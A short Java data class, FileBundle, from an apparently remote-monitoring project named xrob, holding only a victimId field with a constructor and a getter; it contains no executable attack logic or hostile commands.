package com.theah64.xrob.api.models;

/**
 * Created by theapache64 on 18/9/16,4:37 PM.
 */
public class FileBundle {
    private final String victimId;

    public FileBundle(String victimId) {
        this.victimId = victimId;
    }

    public String getVictimId() {
        return victimId;
    }
}
